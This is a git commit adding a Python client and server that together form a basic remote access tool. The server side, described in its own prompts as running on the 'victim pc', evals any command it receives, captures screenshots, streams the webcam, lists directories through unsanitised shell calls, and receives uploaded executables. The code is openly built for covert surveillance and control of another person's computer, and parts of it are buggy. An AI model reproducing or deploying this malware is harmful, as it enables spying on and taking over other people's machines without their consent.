e80b67d1154907f19e9e8cf1306bb7aad2178e9c
Lightningbolt200 <43512335+Lightningbolt200@users.noreply.github.com>
2019-09-08 12:55:36 +0530

    Add files via upload

---
+++ tcpclient.py
@@ -0,0 +1,71 @@
+import socket
+import os,sys
+import cv2
+import base64
+import numpy as np
+import pickle
+import struct
+import cv2,time
+import zmq
+
+hostname = socket.gethostname()    
+ip = socket.gethostbyname(hostname)   
+host=ip
+port=5000
+
+s=socket.socket()
+s.connect((host,port))
+
+
+message = input("->")
+while (message != 'q'):
+    s.sendall(message.encode('utf-8'))
+    if(message == "dir()"):                         #dir()
+        loc=eval(input("enter the location"))
+        s.sendall(loc.encode('utf-8'))
+        data = s.recv(1024).decode()
+        while data:
+            data = s.recv(1024).decode()
+            print(data)
+            if(data=='q'):
+                break
+    if(message=="screenshot()"):                   #screenshot()
+        data = s.recv(4096000)
+        f=open("screenshot1.png",'wb')
+        f.write(data)
+        f.close()
+    if(message=="live_webcam()"):              #live stream
+        while True:
+            try:
+                frame = s.recv(102400)
+                img = base64.b64decode(frame)
+                npimg = np.fromstring(img, dtype=np.uint8)
+                source = cv2.imdecode(npimg, 1)
+                cv2.imshow("Stream", source)
+                cv2.waitKey(5)
+                if cv2.waitKey(100) & 0xff == ord('q'):
+                    break
+            except KeyboardInterrupt:
+                cv2.destroyAllWindows()
+                break
+    if(message=="upload()"):              #upload
+        a=''
+        b=''
+        c=''
+        print("enter the filename \nhint: lol.exe")
+        a=input()
+        print("enter the file location of the file you want to upload \n hint: f:\ ")
+        b=input()
+        print("enter the path where it has to be stored in the victim pc")
+        c=input()
+        f=open(b+a,"r")
+        string = base64.b64encode(f.read())
+        s.send(string)
+        s.send(a.encode('utf-8'))
+        s.send(c.encode('utf-8'))
+    print("next command\n")
+    message = input("->")
+s.close()
+
+
+        
---
+++ tcpserver.py
@@ -0,0 +1,82 @@
+import socket
+import os,sys
+import pyautogui
+import base64
+import cv2
+import pickle
+import struct
+
+import cv2,time
+
+SIZE=1024
+print("waiting for connection..")
+host=''
+port=5000
+loc=''
+
+def screenshot():                                         #screenshot
+    pic = pyautogui.screenshot()
+    pic.save('Screenshot.png')
+    f=open("screenshot.png","rb")
+    content = f.read()
+    c.send(content)
+    f.close()
+
+def upload():                                            #up;oad file
+    string=c.recv(409600)#base64 encryp
+    a=c.recv(409600).decode()#file name
+    b=c.recv(409600).decode()#victim loc
+    f.open(c+a,'w')
+    print(c+a)
+    f.write(string.decode('base64'))
+    f.close()
+    
+
+def live_webcam():                                          #webcam
+    while True:
+        try:
+            camera = cv2.VideoCapture(0)
+            grabbed, frame = camera.read()
+            encoded, buffer = cv2.imencode('.jpg', frame)
+            jpg_as_text = base64.b64encode(buffer)
+            c.send(jpg_as_text)
+        except KeyboardInterrupt:
+             camera.release()
+             cv2.destroyAllWindows()
+             break
+    
+        
+    
+    
+def dir():                                                 #dir
+    print("\n")
+    loc=c.recv(10240).decode()
+    directory=loc+'\system.txt'
+    os.popen('dir '+loc+' > '+directory)
+    os.system('timeout 0.02')
+    f= open(directory,"r")
+    for line in f:
+        c.send(line.encode('utf-8'))
+    line='q'
+    c.send(line.encode('utf-8'))
+    f.close()
+    os.system('del '+ loc+'\system.txt')
+
+    
+    
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((host,port))
+
+s.listen(5)#1 means the no of connection
+c, addr = s.accept()
+print("connection from:"+str(addr))
+while True:
+    data = c.recv(10240).decode()
+    if not data:
+        break
+    print("from connected user:"+str(data))
+    eval(data)
+c.close()
+
+
+
